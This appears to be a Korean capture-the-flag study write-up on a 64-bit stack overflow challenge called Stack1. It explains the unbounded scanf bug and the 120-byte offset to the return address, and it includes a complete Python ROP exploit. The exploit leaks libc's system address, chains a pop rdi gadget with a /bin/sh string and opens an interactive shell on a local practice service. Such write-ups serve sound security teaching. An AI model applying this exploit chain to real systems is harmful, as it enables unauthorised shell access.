# Stack1
### 64bit Basic ROP
***출저를 알 수 없는 그냥 문제입니다.***

사실 tutorial을 풀게 된 이유중 하나가 이 문제 덕분에 풀었었습니다.

풀고 보면 쉬운 문제였는데 괜히 삽질을 했었어요 ㅠㅠ

```
이 문제를 원격으로 실행 시키고 싶으시다면,
socat TCP-LISTEN:9999,reuseaddr,fork,bind=127.0.0.1 EXEC:"./stack1"
위와 같이 socat을 이용하여 열어주시면 됩니다!
```

Stack1 을 실행 시키면, 아래 그림과 같이 입력을 받는 창이 나오고 입력을 한 뒤에는 libc system주소를 뿌려줍니다.

### Main
![Alt text](https://github.com/Funniest/System-study/blob/master/stack1/img/Main.PNG)

### Process
![Alt text]()

Process를 자세히 보면, scanf에서 제한없이 입력을 받아 오버플로우 취약점이 일어나게 됩니다.

sub rsp, 0x70

[rsp+var_70] -> buf는 0x70크기인 것을 알 수 있습니다.

총 크기를 정리하자면 0x70(112) + SFP(8) = 0x78(120)만큼 넣어주면 RIP를 컨트롤 할 수 있습니다.

일단 재가 생각한 시나리오는 아래와 같습니다.
```
1. 처음 아무 값이나 입력하여 info에서 주는 system libc주소를 받아옵니다.
2. system 가젯 및 필요한 가젯들의 offset을 구합니다.
3. 구한 가젯들을 이용하여 익스플로잇합니다.
```
***저는 여기서 system libc주소를 받을 생각을 안하고 한번에 페이로드 쓰려다 시간만 날렸내요 ㅠ_ㅠ***

이제 필요한 가젯들을 구해보면,
```
1. system libc
2. system libc offset
3. pop rdi
4. /bin/sh
```
***64bit에 대한 자세한 글은 tutorial 퓰아룰 작성하며 써놓았으니 참고해주세요!***
***로컬 libc를 보는법 이러던가 콜링 컨벤션 이라던가... 등등..***


***※interact를 꼭 해주셔야 합니다 ㅠ_ㅠ***
### 소스코드
Ubuntu 16 LTS 64 bit환경에서 테스팅 하였습니다.
```
from struct import *
from socket import *
import time
import telnetlib

p = lambda x: pack("<Q", x)
up = lambda x : unpack("<Q", x)[0]

input()

s = socket(AF_INET, SOCK_STREAM)
s.connect(('127.0.0.1', 9999))

bss = 0x601060
poprdi_offset = 0x21102
bin_sh_offset = 0x18c177
offset_system = 0x45390

#leak address
print s.recv(1024)
time.sleep(1)

s.send("1\n")
print s.recv(51)
libc_addr = int(s.recv(14), 16)
print s.recv(12)
libc_system = int(s.recv(14), 16)

print "system : " + str(hex(libc_system))
print "libc : " + str(hex(libc_addr))

libc_addr = libc_system - offset_system

poprdi = libc_addr + poprdi_offset
bin_sh = libc_addr + bin_sh_offset
print "poprdi : " + hex(poprdi)
print "/bin/sh : " + hex(bin_sh)

#testing
print "\n=== testing address ==="
print s.recv(1024)
time.sleep(1)
s.send('1\n')
print s.recv(1024)
time.sleep(1)

#exploit
print "\n=== payload ==="
payload = ''
payload += 'A' * 120
payload += p(poprdi)
payload += p(bin_sh)

payload += p(libc_system)

s.send(payload+"\n")
print s.recv(1024)

t = telnetlib.Telnet()
t.sock = s
t.interact()

s.close()
```
